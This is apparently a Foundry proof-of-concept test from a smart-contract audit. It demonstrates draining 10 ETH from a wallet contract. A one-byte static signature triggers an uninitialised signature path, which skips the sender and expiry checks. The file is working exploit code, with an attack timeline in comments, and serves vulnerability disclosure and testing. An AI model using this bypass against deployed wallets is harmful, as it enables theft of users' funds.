// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    address attacker;

    function setUp() public virtual override {
        console.log("setUp: starting");
        super.setUp();
        console.log("setUp: super.setUp() completed");
        attacker = address(0xdead);
        console.log("setUp: attacker set to", attacker);
    }

    function test_exploit() public {
        console.log("test_exploit: starting");
        // ATTACK TIMELINE:
        // 1. [Setup] Create a Wallet and fund it with 10 ETH
        console.log("test_exploit: calling _createDefaultTopology()");
        string memory topology = _createDefaultTopology();
        console.log("test_exploit: _createDefaultTopology() completed");

        console.log("test_exploit: calling _createWallet()");
        (Stage1Module Wallet, string memory config,) = _createWallet(topology);
        console.log("test_exploit: _createWallet() completed, Wallet at", address(Wallet));

        vm.deal(address(Wallet), 10 ether);
        console.log("test_exploit: funded Wallet with 10 ETH");

        uint256 attackerBalBefore = attacker.balance;
        uint256 walletBalBefore = address(Wallet).balance;
        console.log("test_exploit: attackerBalBefore =", attackerBalBefore);
        console.log("test_exploit: walletBalBefore =", walletBalBefore);

        // 2. [T=now] Attacker crafts a payload to drain Wallet funds to themselves
        console.log("test_exploit: building payload");
        Payload.Decoded memory payload = _buildPayload(1);
        payload.calls = new Payload.Call[](1);
        payload.calls[0].to = attacker;
        payload.calls[0].value = 10 ether;
        payload.calls[0].data = "";
        payload.noChainId = false;
        payload.space = 0;
        console.log("test_exploit: payload built");

        // 3. [T=now] Attacker sets the 0x80 flag byte to trigger static signature path
        // The payload hash is UNINITIALIZED, so _getStaticSignature returns (address(0), far_future_timestamp)
        bytes memory staticSignature = abi.encodePacked(bytes1(0x80));
        console.log("test_exploit: staticSignature created");

        // 4. [T=now] Attacker calls execute() directly. 
        // Because addr == address(0), the msg.sender check is bypassed.
        // Because timestamp is far future, the time check passes.
        console.log("test_exploit: preparing to call Wallet.execute()");
        console.log("test_exploit: block.timestamp =", block.timestamp);
        vm.prank(attacker);
        Wallet.execute(PrimitivesRPC.toPackedPayload(vm, payload), staticSignature);
        console.log("test_exploit: Wallet.execute() completed");

        // 5. [Assert] Verify attacker gained 10 ETH and Wallet lost 10 ETH
        uint256 attackerBalAfter = attacker.balance;
        uint256 walletBalAfter = address(Wallet).balance;
        console.log("test_exploit: attackerBalAfter =", attackerBalAfter);
        console.log("test_exploit: walletBalAfter =", walletBalAfter);

        assertGt(attackerBalAfter, attackerBalBefore, "attacker profited from uninitialized static signature bypass");
        assertEq(attackerBalAfter - attackerBalBefore, 10 ether, "attacker drained exactly 10 ETH");
        assertLt(walletBalAfter, walletBalBefore, "Wallet lost funds");
        console.log("test_exploit: assertions passed");
    }
}
